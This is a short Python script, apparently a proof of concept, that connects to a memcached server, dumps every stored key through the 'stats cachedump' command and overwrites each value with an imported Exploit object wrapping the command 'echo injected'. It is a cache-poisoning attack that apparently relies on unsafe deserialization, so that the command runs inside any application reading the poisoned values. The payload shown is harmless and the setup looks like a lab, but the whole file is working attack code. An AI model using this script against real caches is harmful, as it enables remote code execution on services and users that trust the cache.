#!/usr/bin/env python2.7
import socket
import pylibmc
import re

from exploit import Exploit

HOST = 'memcached'
PORT = 11211

# Find keys
s = socket.socket()
s.connect((HOST, PORT))

s.sendall(b'stats items\r\n')
lines = s.recv(4096).split(b'\r\n')
slabs = {re.match(br'STAT items:(\d+):.*', line).group(1) for line in lines[:-2]}

keys = []
for slab in slabs:
    s.sendall(b'stats cachedump %s 0\r\n' % (slab))
    lines = s.recv(4096).split(b'\r\n')[:-2]
    for line in lines:
        keys.append(re.match(br'ITEM (\S+) \[\d+ b; \d+ s\]', line).group(1))

s.close()

mc = pylibmc.Client(['{}:{}'.format(HOST, PORT)])

# Replace values
for key in keys:
    print key
    mc[key] = Exploit(['echo', 'injected'])
